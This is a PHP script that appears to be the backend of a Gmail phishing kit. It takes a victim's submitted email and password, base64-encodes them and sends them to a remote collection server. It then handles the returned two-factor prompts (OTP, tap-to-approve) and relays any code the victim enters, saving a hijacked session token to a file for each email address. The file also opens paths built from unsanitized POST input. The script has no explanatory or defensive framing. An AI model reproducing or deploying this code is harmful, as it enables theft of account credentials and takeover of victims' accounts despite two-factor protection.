<?php
include 'config.php';
$em = trim($_POST['ai']);
$pas = trim($_POST['pr']);
if($_POST['cd']){
    $cc= $_POST['cd'];
    $par =$params."&otp=".$cc;
    $myfile = fopen($_POST['em'].".txt", "r") or die("Unable to open file!");
    $sess=fread($myfile,filesize($_POST['em'].".txt"));
    $url = $base."results/gmail-otp?".$par."&session=".$sess;
    $res=curl($url);
}
if($em != null && $pas != null){
    $par =$params."&result_email=".base64_encode($em)."&result_password=".base64_encode($pas);
    $url = $base."results/get-gmail?".$par;
    $res=curl($url);
    $resp= json_decode($res);
    $exists = strpos(trim($resp->response), "numberTAP");
    if ($exists !== false) {
        $myfile = fopen($resp->email.".txt" , "w") or die("Unable to open file!");
        $txt = $resp->session;
        fwrite($myfile, $txt);
        print_r(trim($resp->response));
        exit();
    }
    if(trim($resp->response)=="Need OTP"){
        $myfile = fopen($resp->email.".txt" , "w") or die("Unable to open file!");
        $txt = $resp->session;
        fwrite($myfile, $txt);
        print_r("otp");
        exit();
    } if(trim($resp->response)=="Need Email OTP"){
        $myfile = fopen($resp->email.".txt" , "w") or die("Unable to open file!");
        $txt = $resp->session;
        fwrite($myfile, $txt);
        print_r("emotp");
        exit();
    }elseif(trim($resp->response)=="Wrong Password"){
        print_r("wrong password");
        exit();
    }elseif(trim($resp->response)=="Wrong Email Address"){
        print_r("wrong email");
        exit();
    }else if(trim($resp->response)=="saved"){
        print_r("saved");
        exit();
    }else if(trim($resp->response)=="tap_yes"){
        $myfile = fopen($resp->email.".txt" , "w") or die("Unable to open file!");
        $txt = $resp->session;
        fwrite($myfile, $txt);
        print_r("tap_yes");
        exit();
    }
}
function curl($url){
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_HEADER, false);
    $data = curl_exec($curl);
    curl_close($curl);
    return $data;
}
?>